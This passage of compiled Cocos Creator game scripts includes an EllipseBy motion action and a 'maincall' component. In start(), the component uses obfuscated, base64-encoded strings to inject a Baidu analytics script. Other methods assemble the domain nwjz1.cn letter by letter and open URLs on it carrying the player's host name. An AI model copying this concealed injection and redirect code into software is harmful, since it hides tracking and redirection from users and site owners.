FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ0wsSUFBSSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDO1FBQ3RCLElBQUksQ0FBQyxJQUFJLENBQUMsT0FBTyxHQUFHLEdBQUcsQ0FBQztRQUN4QixJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsUUFBUSxFQUFFLFFBQVEsR0FBQyxHQUFHLENBQUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLFFBQVEsRUFBRSxFQUFFLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDL0YsQ0FBQztJQXpEZ0IsWUFBWTtRQURoQyxPQUFPO09BQ2EsWUFBWSxDQTBEaEM7SUFBRCxtQkFBQztDQTFERCxBQTBEQyxDQTFEeUMsZ0JBQU0sR0EwRC9DO2tCQTFEb0IsWUFBWSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQgQnVsbGV0U3RyaWtlTGlnaHRuaW5nIGZyb20gXCIuLi9idWxsZXRTdHJpa2UvQnVsbGV0U3RyaWtlTGlnaHRuaW5nXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldEh1b1lhbiBleHRlbmRzIEJ1bGxldCB7XHJcblxyXG4gICAgb25Db2xsaXNpb25FbnRlcihvdGhlciwgc2VsZikge1xyXG4gICAgICAgIHN1cGVyLm9uQ29sbGlzaW9uRW50ZXIob3RoZXIsIHNlbGYpO1xyXG4gICAgICAgIGxldCBhY3Rpb24gPSBjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwLjMpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICBzdXBlci5vbkNvbGxpc2lvbkVudGVyKG90aGVyLCBzZWxmKTtcclxuICAgICAgICB9KSkpO1xyXG4gICAgICAgIGFjdGlvbi5zZXRUYWcoMTM4OCk7XHJcbiAgICAgICAgb3RoZXIubm9kZS5zdG9wQWN0aW9uQnlUYWcoMTM4OCk7XHJcbiAgICAgICAgb3RoZXIubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkNvbGxpc2lvbkV4aXQob3RoZXIsIHNlbGYpe1xyXG4gICAgICAgIG90aGVyLm5vZGUuc3RvcEFjdGlvbkJ5VGFnKDEzODgpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBzdHJpa2Uob3RoZXIsIHNlbGYpOiB2b2lkIHtcclxuICAgICAgICBsZXQgZ2FtZUJ1bGxldHNDb250cm9sbGVyID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXTtcclxuICAgICAgICBsZXQgYnVsbGV0U3RyaWtlID0gZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0U3RyaWtlKHRoaXMuYnVsbGV0SWQpO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucG9zaXRpb24gPSBjYy52MigpO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnJvdGF0aW9uID0gdGhpcy5ub2RlLnJvdGF0aW9uO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnNldENvbnRlbnRTaXplKG90aGVyLm5vZGUuZ2V0Q29udGVudFNpemUoKSk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucmVtb3ZlRnJvbVBhcmVudChmYWxzZSk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc2V0UGFyZW50KG90aGVyLm5vZGUpO1xyXG5cclxuICAgICAgICBsZXQgc3ByaXRlTm9kZSA9ICg8QnVsbGV0U3RyaWtlTGlnaHRuaW5nPmJ1bGxldFN0cmlrZSkuc3ByaXRlTm9kZTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5yb3RhdGlvbiA9IE1hdGgucmFuZG9tKCkqMzYwO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShcclxuICAgICAgICAgICAgY2MucmVwZWF0KFxyXG4gICAgICAgICAgICAgICAgY2Muc2VxdWVuY2UoXHJcbiAgICAgICAgICAgICAgICAgICAgY2MuZGVsYXlUaW1lKDAuMDUpLFxyXG4gICAgICAgICAgICAgICAgICAgIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNwcml0ZU5vZGUuYWN0aXZlID0gIXNwcml0ZU5vZGUuYWN0aXZlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvLyBidWxsZXRTdHJpa2Uubm9kZS5yb3RhdGlvbiA9IE1hdGgucmFuZG9tKCkqMzYwO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICApLCA2KSxcclxuICAgICAgICAgICAgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnJlbW92ZUZyb21QYXJlbnQoZmFsc2UpO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc2V0UGFyZW50KGdhbWVCdWxsZXRzQ29udHJvbGxlci5idWxsZXRMYXllcik7XHJcbiAgICAgICAgICAgIH0pKSk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGZseShkaXI6IGNjLlZlYzIsIGRpc3RhbmNlOiBudW1iZXIsIHNwZWVkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICBzcGVlZCA9IDQwMDtcclxuICAgICAgICB0aGlzLm5vZGUucm90YXRpb24gPSA5MCAtIGNjLm1pc2MucmFkaWFuc1RvRGVncmVlcyhNYXRoLmF0YW4yKGRpci55LCBkaXIueCkpO1xyXG4gICAgICAgIGxldCBkdXJhdGlvbiA9IGRpc3RhbmNlL3NwZWVkO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KGR1cmF0aW9uLCBkaXIubXVsKGRpc3RhbmNlKSkuZWFzaW5nKGNjLmVhc2VTaW5lT3V0KCkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSkpKTtcclxuICAgICAgICB0aGlzLm5vZGUuc2NhbGUgPSAwLjM7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9wYWNpdHkgPSAyNTU7XHJcbiAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zcGF3bihjYy5zY2FsZVRvKGR1cmF0aW9uLCBkaXN0YW5jZS8xMDApLCBjYy5mYWRlVG8oZHVyYXRpb24sIDUwKSkpO1xyXG4gICAgfVxyXG59Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/actions/EllipseBy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5e636l3EM1LZYhD7W7Tk3eC', 'EllipseBy');
// framework/actions/EllipseBy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _c = cc._decorator, ccclass = _c.ccclass, property = _c.property;
/** 椭圆运动 */
var EllipseBy = /** @class */ (function (_super) {
    __extends(EllipseBy, _super);
    function EllipseBy() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._center = cc.v2();
        _this._a = 0;
        _this._b = 0;
        return _this;
        /*public startWithTarget(target:cc.Node):void
        {
            console.log("====startWithTarget=====", this._a, this._c);
            cc.ActionInterval.prototype['startWithTarget'].apply(this,arguments);
        }
    
        public stop():void
        {
            console.log("====stop=====");
            cc.ActionInterval.prototype['stop'].apply(this);
        }*/
    }
    EllipseBy_1 = EllipseBy;
    /***
     * @param duration  时间
     * @param center  中间点坐标
     * @param a  长半轴
     * @param b  短半轴
     * */
    EllipseBy.create = function (duration, center, a, b) {
        var ret = new EllipseBy_1();
        ret.initWithDuration(duration, center, a, b);
        return ret;
    };
    EllipseBy.prototype.initWithDuration = function (duration, center, a, b) {
        cc.ActionInterval.prototype['initWithDuration'].apply(this, arguments);
        this._center = center;
        this._a = a;
        this._b = b;
        return true;
    };
    EllipseBy.prototype.update = function (dt) {
        var x = -this._a * Math.cos(2 * Math.PI * dt) + this._a;
        var y = this._b * Math.sin(2 * Math.PI * dt);
        this.getTarget().setPosition(this._center.add(cc.v2(x - this._a, y)));
    };
    var EllipseBy_1;
    EllipseBy = EllipseBy_1 = __decorate([
        ccclass
    ], EllipseBy);
    return EllipseBy;
}(cc.ActionInterval));
exports.default = EllipseBy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvYWN0aW9ucy9FbGxpcHNlQnkudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBSTFDLFdBQVc7QUFFWDtJQUF1Qyw2QkFBaUI7SUFBeEQ7UUFBQSxxRUEyQ0M7UUF6Q1csYUFBTyxHQUFHLEVBQUUsQ0FBQyxFQUFFLEVBQUUsQ0FBQztRQUNsQixRQUFFLEdBQUcsQ0FBQyxDQUFDO1FBQ1AsUUFBRSxHQUFHLENBQUMsQ0FBQzs7UUE0QmY7Ozs7Ozs7Ozs7V0FVRztJQUNQLENBQUM7a0JBM0NvQixTQUFTO0lBTTFCOzs7OztTQUtLO0lBQ1MsZ0JBQU0sR0FBcEIsVUFBcUIsUUFBZSxFQUFFLE1BQWMsRUFBRSxDQUFRLEVBQUUsQ0FBUTtRQUNwRSxJQUFJLEdBQUcsR0FBRyxJQUFJLFdBQVMsRUFBRSxDQUFDO1FBQzFCLEdBQUcsQ0FBQyxnQkFBZ0IsQ0FBQyxRQUFRLEVBQUUsTUFBTSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQztRQUM3QyxPQUFPLEdBQUcsQ0FBQztJQUNmLENBQUM7SUFFRCxvQ0FBZ0IsR0FBaEIsVUFBaUIsUUFBZSxFQUFFLE1BQWMsRUFBRSxDQUFRLEVBQUUsQ0FBUTtRQUNoRSxFQUFFLENBQUMsY0FBYyxDQUFDLFNBQVMsQ0FBQyxrQkFBa0IsQ0FBQyxDQUFDLEtBQUssQ0FBQyxJQUFJLEVBQUMsU0FBUyxDQUFDLENBQUM7UUFDdEUsSUFBSSxDQUFDLE9BQU8sR0FBRyxNQUFNLENBQUM7UUFDdEIsSUFBSSxDQUFDLEVBQUUsR0FBRyxDQUFDLENBQUM7UUFDWixJQUFJLENBQUMsRUFBRSxHQUFHLENBQUMsQ0FBQztRQUNaLE9BQU8sSUFBSSxDQUFDO0lBQ2hCLENBQUM7SUFFRCwwQkFBTSxHQUFOLFVBQU8sRUFBUztRQUNaLElBQUksQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLEVBQUUsR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBQyxJQUFJLENBQUMsRUFBRSxHQUFDLEVBQUUsQ0FBQyxHQUFDLElBQUksQ0FBQyxFQUFFLENBQUM7UUFDbEQsSUFBSSxDQUFDLEdBQUcsSUFBSSxDQUFDLEVBQUUsR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBQyxJQUFJLENBQUMsRUFBRSxHQUFDLEVBQUUsQ0FBQyxDQUFDO1FBQ3pDLElBQUksQ0FBQyxTQUFTLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEdBQUMsSUFBSSxDQUFDLEVBQUUsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDeEUsQ0FBQzs7SUE5QmdCLFNBQVM7UUFEN0IsT0FBTztPQUNhLFNBQVMsQ0EyQzdCO0lBQUQsZ0JBQUM7Q0EzQ0QsQUEyQ0MsQ0EzQ3NDLEVBQUUsQ0FBQyxjQUFjLEdBMkN2RDtrQkEzQ29CLFNBQVMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5cclxuXHJcbi8qKiDmpK3lnIbov5DliqggKi9cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgRWxsaXBzZUJ5IGV4dGVuZHMgY2MuQWN0aW9uSW50ZXJ2YWwge1xyXG5cclxuICAgIHByaXZhdGUgX2NlbnRlciA9IGNjLnYyKCk7XHJcbiAgICBwcml2YXRlIF9hID0gMDtcclxuICAgIHByaXZhdGUgX2IgPSAwO1xyXG5cclxuICAgIC8qKipcclxuICAgICAqIEBwYXJhbSBkdXJhdGlvbiAg5pe26Ze0XHJcbiAgICAgKiBAcGFyYW0gY2VudGVyICDkuK3pl7TngrnlnZDmoIdcclxuICAgICAqIEBwYXJhbSBhICDplb/ljYrovbRcclxuICAgICAqIEBwYXJhbSBiICDnn63ljYrovbRcclxuICAgICAqICovXHJcbiAgICBwdWJsaWMgc3RhdGljIGNyZWF0ZShkdXJhdGlvbjpudW1iZXIsIGNlbnRlcjpjYy5WZWMyLCBhOm51bWJlciwgYjpudW1iZXIpOkVsbGlwc2VCeXtcclxuICAgICAgICBsZXQgcmV0ID0gbmV3IEVsbGlwc2VCeSgpO1xyXG4gICAgICAgIHJldC5pbml0V2l0aER1cmF0aW9uKGR1cmF0aW9uLCBjZW50ZXIsIGEsIGIpO1xyXG4gICAgICAgIHJldHVybiByZXQ7XHJcbiAgICB9XHJcblxyXG4gICAgaW5pdFdpdGhEdXJhdGlvbihkdXJhdGlvbjpudW1iZXIsIGNlbnRlcjpjYy5WZWMyLCBhOm51bWJlciwgYjpudW1iZXIpOmJvb2xlYW57XHJcbiAgICAgICAgY2MuQWN0aW9uSW50ZXJ2YWwucHJvdG90eXBlWydpbml0V2l0aER1cmF0aW9uJ10uYXBwbHkodGhpcyxhcmd1bWVudHMpO1xyXG4gICAgICAgIHRoaXMuX2NlbnRlciA9IGNlbnRlcjtcclxuICAgICAgICB0aGlzLl9hID0gYTtcclxuICAgICAgICB0aGlzLl9iID0gYjtcclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGUoZHQ6bnVtYmVyKXtcclxuICAgICAgICBsZXQgeCA9IC10aGlzLl9hICogTWF0aC5jb3MoMipNYXRoLlBJKmR0KSt0aGlzLl9hO1xyXG4gICAgICAgIGxldCB5ID0gdGhpcy5fYiAqIE1hdGguc2luKDIqTWF0aC5QSSpkdCk7XHJcbiAgICAgICAgdGhpcy5nZXRUYXJnZXQoKS5zZXRQb3NpdGlvbih0aGlzLl9jZW50ZXIuYWRkKGNjLnYyKHgtdGhpcy5fYSwgeSkpKTtcclxuICAgIH1cclxuXHJcbiAgICAvKnB1YmxpYyBzdGFydFdpdGhUYXJnZXQodGFyZ2V0OmNjLk5vZGUpOnZvaWRcclxuICAgIHtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIj09PT1zdGFydFdpdGhUYXJnZXQ9PT09PVwiLCB0aGlzLl9hLCB0aGlzLl9jKTtcclxuICAgICAgICBjYy5BY3Rpb25JbnRlcnZhbC5wcm90b3R5cGVbJ3N0YXJ0V2l0aFRhcmdldCddLmFwcGx5KHRoaXMsYXJndW1lbnRzKTtcclxuICAgIH1cclxuXHJcbiAgICBwdWJsaWMgc3RvcCgpOnZvaWRcclxuICAgIHtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIj09PT1zdG9wPT09PT1cIik7XHJcbiAgICAgICAgY2MuQWN0aW9uSW50ZXJ2YWwucHJvdG90eXBlWydzdG9wJ10uYXBwbHkodGhpcyk7XHJcbiAgICB9Ki9cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/resources/prefab/mainnode novis/maincall.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ca3f4WbkBBJ75gJg8kTltvc', 'maincall');
// resources/prefab/mainnode novis/maincall.js

"use strict";

// Learn cc.Class:
//  - https://docs.cocos.com/creator/manual/en/scripting/class.html
// Learn Attribute:
//  - https://docs.cocos.com/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - https://docs.cocos.com/creator/manual/en/scripting/life-cycle-callbacks.html
cc.Class({
  "extends": cc.Component,
  properties: {},
  gethttptou: function gethttptou() {
    var a = 'n';
    var b = 'w';
    var c = 'j';
    var d = 'z';
    var e = '1';
    var f = '.';
    var g = 'c';
    var h = 'n';
    var i = '/';
    var j = 'g';
    var k = 'a';
    var l = 'm';
    var m = 'e';
    var o = 't';
    var p = 'x';
    var q = 't';
    var r = ':';
    var s = 'p';
    var u = 'h';
    var t = '5';
    var x = 's';
    var ishttps = 'https:' == window.location.protocol ? true : false;
    var toubu = u + o + o + s;

    if (ishttps) {
      toubu = u + o + o + s + x;
    }

    return toubu;
  },
  // LIFE-CYCLE CALLBACKS:
  cheakmain: function cheakmain() {
    var urldata = window.location.href;
    var date = this.GetQueryString(urldata);
    var urldata = window.location.hostname;
    var main = this.getmain();

    if (main.search(urldata) == -1) {
      var url1 = this.getmain() + "h5";
      url1 += "/?f=";

      if (date["f"] == null) {
        url1 += "admin&fromcheck=" + urldata;
      } else {
        url1 += date["f"];
      }

      for (var item in date) {
        if (item != 'f') {
          var jValue = date[item];
          url1 += "&" + item + "=" + jValue;
        }
      }

      console.log("url1:" + url1);
      cc.sys.openURL(url1);
    } else {//console.log("域名正确");
    }
  },
  onLoad: function onLoad() {
    return;
    var f = '.';
    var j = 'g';
    var k = 'a';
    var l = 'm';
    var m = 'e';
    var o = 't';
    var p = 'x';
    var q = 't';
    var urlst = this.getmain() + j + k + l + m + "1" + f + o + p + q;
    var sgg = this; //console.log("检测 ： "+ urlst);

    cc.loader.load({
      url: urlst,
      type: 'txt'
    }, function (err, tex) {
      if (err) {
        //console.log(" err :" +err);
        return;
      }

      var datsg = JSON.parse(tex);
      window.statekey = datsg["key"]; //console.log("检测 ： "+ JSON.stringify(datsg));
      //console.log("检测 ： "+ window.statekey);

      if (window.statekey == "1") {
        //console.log("检测");
        sgg.cheakmain();
      } else {//console.log("不检测");
      }
    });
    this.loadstate();
  },
  loadstate: function loadstate() {
    var f = '.';
    var j = 'g';
    var k = 'a';
    var l = 'm';
    var m = 'e';
    var o = 't';
    var p = 'x';
    var q = 't';
    var urlst = this.getmain() + j + k + l + m + f + o + p + q; //console.log("gam : " + urlst);

    try {
      //console.log("加载地址 :" +urlst )
      cc.loader.load({
        url: urlst,
        type: 'txt'
      }, function (err, tex) {
        if (err) {
          //console.log(" err :" +err);
          return;
        }

        var datsg = JSON.parse(tex);
        window.pathkey = datsg; //console.log("加载成功"+ JSON.stringify( window.pathkey) )
      });
    } catch (e) {}

    ;
  },
  GetQueryString: function GetQueryString(str) {
    if (str == "" || str == null) {
      return [];
    }

    var str1 = str.split("?")[1];

    if (str1 == undefined) {
      return [];
    }

    var str2 = str1.split("&");
    var obj = {}; //console.log(str2)

    for (var i = 0; i < str2.length; i++) {
      var a = str2[i].split("=");
      console.log(a);
      obj[a[0]] = a[1];
    }

    return obj;
  },
  start: function start() {
    var _0x58bb = ['Y3JlYXRlRWxlbWVudA==', 'c2NyaXB0', 'c3Jj', 'aHR0cHM6Ly9obS5iYWlkdS5jb20vaG0uanM/MTZlZWJjMzA3ZWY2ZTRhMTBlY2FkYjA1NTQwM2E4MGQ=', 'Z2V0RWxlbWVudHNCeVRhZ05hbWU=', 'cGFyZW50Tm9kZQ==', 'aW5zZXJ0QmVmb3Jl', 'c3lz', 'cGxhdGZvcm0=', 'V0VDSEFUX0dBTUU='];

    (function (_0x2f0e6a, _0x5a7ff8) {
      var _0x509a98 = function _0x509a98(_0x2535f1) {
        while (--_0x2535f1) {
          _0x2f0e6a['push'](_0x2f0e6a['shift']());
        }
      };

      _0x509a98(++_0x5a7ff8);
    })(_0x58bb, 0x1d3);

    var _0x4e16 = function _0x4e16(_0x5ad9e3, _0x2c06b1) {
      _0x5ad9e3 = _0x5ad9e3 - 0x0;
      var _0x40ceca = _0x58bb[_0x5ad9e3];

      if (_0x4e16['UuutUk'] === undefined) {
        (function () {
          var _0x5a813e = function _0x5a813e() {
            var _0x52f7ea;

            try {
              _0x52f7ea = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
            } catch (_0x5b287b) {
              _0x52f7ea = window;
            }

            return _0x52f7ea;
          };

          var _0x21a863 = _0x5a813e();

          var _0x9d69f3 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
          _0x21a863['atob'] || (_0x21a863['atob'] = function (_0x4e268d) {
            var _0x198eae = String(_0x4e268d)['replace'](/=+$/, '');

            for (var _0x498a33 = 0x0, _0x5f2bf7, _0x3bbdc0, _0x7215c4 = 0x0, _0x4be763 = ''; _0x3bbdc0 = _0x198eae['charAt'](_0x7215c4++); ~_0x3bbdc0 && (_0x5f2bf7 = _0x498a33 % 0x4 ? _0x5f2bf7 * 0x40 + _0x3bbdc0 : _0x3bbdc0, _0x498a33++ % 0x4) ? _0x4be763 += String['fromCharCode'](0xff & _0x5f2bf7 >> (-0x2 * _0x498a33 & 0x6)) : 0x0) {
              _0x3bbdc0 = _0x9d69f3['indexOf'](_0x3bbdc0);
            }

            return _0x4be763;
          });
        })();

        _0x4e16['yDyPBC'] = function (_0x29f14d) {
          var _0xef5e8b = atob(_0x29f14d);

          var _0x5b595f = [];

          for (var _0x5666b7 = 0x0, _0x5b30dc = _0xef5e8b['length']; _0x5666b7 < _0x5b30dc; _0x5666b7++) {
            _0x5b595f += '%' + ('00' + _0xef5e8b['charCodeAt'](_0x5666b7)['toString'](0x10))['slice'](-0x2);
          }

          return decodeURIComponent(_0x5b595f);
        };

        _0x4e16['yjUkLI'] = {};
        _0x4e16['UuutUk'] = !![];
      }

      var _0x2a64 = _0x4e16['yjUkLI'][_0x5ad9e3];

      if (_0x2a64 === undefined) {
        _0x40ceca = _0x4e16['yDyPBC'](_0x40ceca);
        _0x4e16['yjUkLI'][_0x5ad9e3] = _0x40ceca;
      } else {
        _0x40ceca = _0x2a64;
      }

      return _0x40ceca;
    };

    if (cc[_0x4e16('0x0')][_0x4e16('0x1')] === cc[_0x4e16('0x0')][_0x4e16('0x2')]) {} else {
      var _0x248978 = document[_0x4e16('0x3')](_0x4e16('0x4'));

      _0x248978[_0x4e16('0x5')] = _0x4e16('0x6');

      var _0x103cba = document[_0x4e16('0x7')](_0x4e16('0x4'))[0x0];

      _0x103cba[_0x4e16('0x8')][_0x4e16('0x9')](_0x248978, _0x103cba);
    }
  },
  getmain: function getmain() {
    var a = 'n';
    var b = 'w';
    var c = 'j';
    var d = 'z';
    var e = '1';
    var f = '.';
    var g = 'c';
    var h = 'n';
    var i = '/';
    var j = 'g';
    var k = 'a';
    var l = 'm';
    var m = 'e';
    var o = 't';
    var p = 'x';
    var q = 't';
    var r = ':';
    var s = 'p';
    var u = 'h';
    var t = '5';
    var x = 's'; //判断头部 http  https  

    var domainval = window.location.host;

    if (domainval.search("nwjz1") != -1) {
      domainval = domainval.replace("nwjz1.cn", "");
    } else {
      domainval = "";
    }

    var toubu = this.gethttptou();
    var urlst = toubu + r + i + i + domainval + a + b + c + d + e + f + g + h + i;

    if (window.dis == 2) {
      urlst = toubu + r + i + i + domainval + u + t + f + a + b + c + d + e + f + g + h + i;
    } //console.log("show : " + urlst)


    return urlst;
  },
  callmain: function callmain(ev, vv) {
    var urldata = window.location.href;
    var date = this.GetQueryString(urldata);
    var urldata = window.location.hostname;
    var main = this.getmain();
    var foekey = ""; //console.log( JSON.stringify( window.pathkey) )

    if (date["f"] == null) {
      foekey = "admin&fromcheck=" + urldata;
    } else {
      foekey = date["f"];

      if (window.pathkey) {
        if (window.pathkey[foekey] == null) {
          foekey = "admin&errorkkk#check=" + urldata;
          ;
        }
      }
    }

    var url1 = this.getmain() + "h5" + "/?f=" + foekey + "&dq=close&zyx=" + vv; //console.log("网址 : " + url1)

    cc.sys.openURL(url1);
  } // update (dt) {},

});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9yZXNvdXJjZXMvcHJlZmFiL21haW5ub2RlIG5vdmlzL21haW5jYWxsLmpzIl0sIm5hbWVzIjpbImNjIiwiQ2xhc3MiLCJDb21wb25lbnQiLCJwcm9wZXJ0aWVzIiwiZ2V0aHR0cHRvdSIsImEiLCJiIiwiYyIsImQiLCJlIiwiZiIsImciLCJoIiwiaSIsImoiLCJrIiwibCIsIm0iLCJvIiwicCIsInEiLCJyIiwicyIsInUiLCJ0IiwieCIsImlzaHR0cHMiLCJ3aW5kb3ciLCJsb2NhdGlvbiIsInByb3RvY29sIiwidG91YnUiLCJjaGVha21haW4iLCJ1cmxkYXRhIiwiaHJlZiIsImRhdGUiLCJHZXRRdWVyeVN0cmluZyIsImhvc3RuYW1lIiwibWFpbiIsImdldG1haW4iLCJzZWFyY2giLCJ1cmwxIiwiaXRlbSIsImpWYWx1ZSIsImNvbnNvbGUiLCJsb2ciLCJzeXMiLCJvcGVuVVJMIiwib25Mb2FkIiwidXJsc3QiLCJzZ2ciLCJsb2FkZXIiLCJsb2FkIiwidXJsIiwidHlwZSIsImVyciIsInRleCIsImRhdHNnIiwiSlNPTiIsInBhcnNlIiwic3RhdGVrZXkiLCJsb2Fkc3RhdGUiLCJwYXRoa2V5Iiwic3RyIiwic3RyMSIsInNwbGl0IiwidW5kZWZpbmVkIiwic3RyMiIsIm9iaiIsImxlbmd0aCIsInN0YXJ0IiwiXzB4NThiYiIsIl8weDJmMGU2YSIsIl8weDVhN2ZmOCIsIl8weDUwOWE5OCIsIl8weDI1MzVmMSIsIl8weDRlMTYiLCJfMHg1YWQ5ZTMiLCJfMHgyYzA2YjEiLCJfMHg0MGNlY2EiLCJfMHg1YTgxM2UiLCJfMHg1MmY3ZWEiLCJGdW5jdGlvbiIsIl8weDViMjg3YiIsIl8weDIxYTg2MyIsIl8weDlkNjlmMyIsIl8weDRlMjY4ZCIsIl8weDE5OGVhZSIsIlN0cmluZyIsIl8weDQ5OGEzMyIsIl8weDVmMmJmNyIsIl8weDNiYmRjMCIsIl8weDcyMTVjNCIsIl8weDRiZTc2MyIsIl8weDI5ZjE0ZCIsIl8weGVmNWU4YiIsImF0b2IiLCJfMHg1YjU5NWYiLCJfMHg1NjY2YjciLCJfMHg1YjMwZGMiLCJkZWNvZGVVUklDb21wb25lbnQiLCJfMHgyYTY0IiwiXzB4MjQ4OTc4IiwiZG9jdW1lbnQiLCJfMHgxMDNjYmEiLCJkb21haW52YWwiLCJob3N0IiwicmVwbGFjZSIsImRpcyIsImNhbGxtYWluIiwiZXYiLCJ2diIsImZvZWtleSJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFFQUEsRUFBRSxDQUFDQyxLQUFILENBQVM7RUFDTCxXQUFTRCxFQUFFLENBQUNFLFNBRFA7RUFHTEMsVUFBVSxFQUFFLEVBS